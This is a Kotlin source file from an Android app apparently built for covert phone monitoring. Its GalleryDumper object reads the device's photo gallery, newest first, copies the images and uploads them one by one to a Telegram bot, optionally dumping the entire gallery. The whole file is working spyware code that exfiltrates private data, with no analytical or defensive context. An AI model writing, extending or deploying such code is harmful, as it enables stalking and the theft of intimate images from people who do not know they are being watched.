package com.dec.monitor.media

import android.content.Context
import android.provider.MediaStore
import com.dec.monitor.TelegramBot
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.io.File

object GalleryDumper {

    // count = -1 means full gallery
    suspend fun sendLatest(context: Context, count: Int) = withContext(Dispatchers.IO) {
        try {
            val projection = arrayOf(
                MediaStore.Images.Media.DATA,
                MediaStore.Images.Media.DISPLAY_NAME,
                MediaStore.Images.Media.DATE_ADDED
            )

            val cursor = context.contentResolver.query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                projection,
                null, null,
                "${MediaStore.Images.Media.DATE_ADDED} DESC"
            )

            val total = cursor?.count ?: 0
            val limit = when {
                count == -1 -> total
                count == -2 -> total / 2
                else -> count
            }

            TelegramBot.sendMessage("🖼 Sending $limit of $total photos...")

            var sent = 0
            cursor?.use { c ->
                while (c.moveToNext() && sent < limit) {
                    val path = c.getString(c.getColumnIndexOrThrow(MediaStore.Images.Media.DATA))
                    val name = c.getString(c.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME))
                    val file = File(path)
                    if (file.exists()) {
                        val copy = File(context.cacheDir, "g_$name")
                        file.copyTo(copy, overwrite = true)
                        TelegramBot.sendPhoto(copy, "🖼 $name")
                        sent++
                    }
                }
            }

            TelegramBot.sendMessage("✅ Gallery dump complete — $sent photos sent")

        } catch (e: Exception) {
            TelegramBot.sendMessage("🖼 Gallery error: ${e.message}")
        }
    }
}
